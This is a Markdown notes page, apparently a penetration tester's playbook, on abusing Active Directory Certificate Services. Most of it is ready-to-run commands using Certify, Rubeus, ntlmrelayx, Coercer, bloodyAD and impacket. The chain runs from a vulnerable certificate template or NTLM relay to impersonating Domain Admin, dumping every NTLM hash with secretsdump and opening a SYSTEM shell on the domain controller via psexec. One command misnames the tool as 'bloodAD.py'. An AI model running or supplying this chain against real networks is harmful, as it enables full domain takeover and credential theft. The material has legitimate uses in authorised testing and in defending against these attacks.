---
title: Attacking Active Directory Certificate Services
tags:
  - breach
  - operations
  - attack
  - active
  - directory
  - certificates
  - services
  - service
  - certificate
---

A majority of the discussion in this section references
[a SpecterOps](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
paper on abusing **Active Directory Certificate Services (ADCS)**.

## Misconfigured certificate templates

We can use the [Certify](https://github.com/GhostPack/Certify) toolkit to
identify vulnerable certificate templates by invoking the following:

```powershell
Start-Process `
	-FilePath ".\Certify.exe" `
	-ArgumentList @(
		"find",
		"/vulnerable"
	)
```

If we identify a vulnerable certificate template that enables low-privileged
users to enroll certificates with an alternative subject name and that allow
user login, we can use
[PowerSploit's PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
tool to identify Domain Administrators by invoking the following:

```powershell
. .\PowerView.ps1
Get-DomainGroupMember -Identity 'Domain Admins'
```

Finding a valid Domain Admin, we can use the **Certify** toolkit again to enroll
a certificate:

```powershell
Start-Process `
	-FilePath ".\Certify.exe" `
	-ArgumentList @(
		"request",
		"/ca:${DOMAIN}\${DOMAIN_CONTROLLER}",
		"/template:${TEMPLATE_NAME}",
		"/altname:${DOMAIN_ADMIN_USERNAME}"
	)
```

After successfully enrolling a certificate, a certificate will be printed to
`stdout` starting with `-----BEGIN RSA PRIVATE KEY-----`. Write all of the
contents of the certificate to a `.pem` file so we can operate on it. Using
**openssl**, we can convert the certificate to a `.pfx` file:

```powershell
Start-Process `
	-FilePath "openssl" `
	-ArgumentList @(
		"pkcs12",
		"-in",
		"${PEM_FILE}",
		"-keyex",
		"-CSP",
		"'Microsoft Enhanced Cryptographic Provider v1.0'",
		"-export",
		"-out",
		"${OUTFILE}.pfx"
	)
```

With our new `.pfx` certificate in hand, we can use
[Rubeus](https://github.com/GhostPack/Rubeus) to request a **Ticket Granting
Ticket (TGT)** by invoking the following, injecting the TGT into our user's
memory:

```powershell
Start-Process `
	-FilePath ".\Rubeus.exe" `
	-ArgumentList @(
		"asktgt",
		"/user:${DOMAIN_ADMIN_USERNAME}",
		"/certificate:${OUTFILE}.pfx",
		"/password:${CERTIFICATE_PASSWORD}",
		"/ptt"
	)
```

## Attacking ADCS HTTP endpoints

The ADCS certificate enrollment process typically involves an HTTP-based web
server that hosts an ASP application endpoint at
`http://${CASERVERHOSTNAME}/certsrv`. The enrollment server doesn't always use
HTTPS by default, making it vulnerable to an HTTP relay attack.

When we perform our attack, we trick privileged accounts like machine or service
accounts, e.g. the Domain Controller account, to authenticate to our attacker
machine. We can then relay this authentication to the certificate enrollment
service while requesting access to a certificate template that contains Client
Authentication to a target we want to compromise.

Using the [Certipy](https://github.com/ly4k/Certipy) tool, we can enumerate a
domain's certificate templates for vulnerable configurations by invoking the
following:

```bash
certipy-ad find -u "${USER}@${DOMAIN}" -p "${PASSWORD}" -dc-ip ${DOMAIN_CONTROLLER_IPADDR} -enabled
```

We could use a tool like [Bloodhound](https://github.com/SpecterOps/BloodHound)
to interpret the results of the above invocation. Finding a vulnerable template,
we can use **impacket-ntlmrelayx** to stage our NTLM relay:

```bash
impacket-ntlmrelayx -t "http://${CA_HOSTNAME}/certsrv/certfnsh.asp" --adcs --template ${VULNERABLE_TEMPLATE} -smb2support
```

We can use the [Coercer](https://github.com/p0dalirius/Coercer) toolkit to
coerce the Domain Controller account to authenticate to our fake service using
vulnerable RPC commands. In the following example, we abuse the
`EfsRpcAddUsersToFile` RPC endpoint:

```bash
coercer coerce --target-ip ${DC_IPADDR} --l ${LHOST} -u ${USER} -p ${PASS} --filter-method-name EfsRpcAddUsersToFile
```

After invoking the above, the Domain Controller will authenticate to us and our
NTLM relay will use the Domain Controller's authentication to enroll a new
certificate for authentication. **impacket** will proceed to write the `.pfx`
certificate to disk.

## Abusing LDAP with certs

Sometimes the Kerberos Key Distribution Center (KDC) doesn't have certificate
authentication enabled. We can abuse LDAP with a certificate we've enrolled for
the Domain Controller to pivot and pwn the domain.

Using [bloodyAD](https://github.com/CravateRouge/bloodyAD), we see if we can
create a new computer within the domain:

```bash
python bloodyAD.py -d ${DOMAIN} -u ${USER} -p ${PASS} --host ${DC_IPADDR} get object "DC=${DOMAIN},DC=com" --attr ms-DS-MachineAccountQuota
```

If the `ms-DS-MachineAccountQuota` is greater than 0, we're good to go for
creating a new host. We can invoke the following to do this:

```bash
python bloodyAD.py -d ${DOMAIN} -u ${USER} -p ${PASS} --host ${DC_IPADDR} add computer ${COMPUTERNAME} ${COMPUTERPASSWORD}
```

We invoke the following to convert our `.pfx` file to a `.pem` file and then use
the Domain Controller's certificate to enable our new computer to impersonate
users:

```bash
openssl pkcs12 -in ${CERT}.pfx -out ${CERT}.pem -nodes
python bloodAD.py -d ${DOMAIN} -c ":${CERT}.pem" -u "${COMPUTERNAME}$" --host ${DC_IPADDR} add rbcd "${DC_COMPUTERNAME}$" "${COMPUTERNAME}$"
```

With the ability to impersonate any user, let's acquire a Kerberos TGT for the
**Administrator** account on the Domain Controller:

```bash
impacket-getST -spn LDAP/${DC_COMPUTERNAME}.${DOMAIN} -impersonate Administrator -dc-ip ${DC_IPADDR} "${DOMAIN}/${COMPUTERNAME}:${PASSWORD}"
```

This will create a `.ccache` file for the user we've impersonated. Using
techniques from our
[[linux-lateral-movement#Impacket|Linux lateral movement - Impacket]] and
[[windows-lateral-movement#Metasploit|Windows lateral movement - Metasploit]]
discussions, we can establish a **SOCKS5** proxy with our current access into
the domain and use **proxychains** to enumerate and attack the domain with our
new Kerberos TGT.

For example, we can dump all NTLM hashes from the domain controller by invoking
the following:

```bash
proxychains python /usr/share/doc/python3-impacket/examples/secretsdump.py "${DOMAIN}/Administrator@${DC_COMPUTERNAME}.${DOMAIN}" -k -no-pass -dc-ip ${DC_IPADDR} -target-ip ${DC_IPADDR}
```

Even juicier, let's obtain a shell as **SYSTEM** on the Domain Controller using
`psexec`:

```bash
proxychains python /usr/share/doc/python3-impacket/examples/psexec.py "${DOMAIN}/Administrator@${DC_COMPUTERNAME}.${DOMAIN}" -k -no-pass -dc-ip ${DC_IPADDR} -target-ip ${DC_IPADDR}
```

## References

- [AD Certifried](https://cravaterouge.com/articles/ad-certifried/)
